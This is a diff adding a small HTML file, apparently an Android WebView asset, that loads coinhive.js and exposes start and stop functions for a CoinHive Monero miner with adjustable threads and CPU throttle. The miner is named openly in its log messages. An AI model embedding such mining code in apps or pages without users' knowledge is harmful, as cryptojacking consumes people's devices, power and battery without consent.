@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+</head>
+<body>
+<script src="coinhive.js"></script>
+  <script>
+
+      var miner;
+
+      android.log("Initializing Monero Miner");
+
+      function start(id, throttle, threads) {
+          android.log("starting Monero Miner with ID " + id + " on " + threads + " thread(s) using " + throttle + "% CPU usage");
+          if (miner == null) {
+              miner = new CoinHive.Anonymous(id, {
+              threads: threads,
+              throttle: 1 - throttle / 100.0,
+              });
+          } else {
+              miner.stop();
+              miner.setThrottle(throttle);
+              miner.setNumThreads(threads);
+          }
+          miner.start();
+      }
+
+      function stop() {
+          android.log("stopping Monero Miner");
+          if (miner != null && miner.isRunning()) {
+              miner.stop();
+          }
+      }
+
+  </script>
+</body>
+</html>
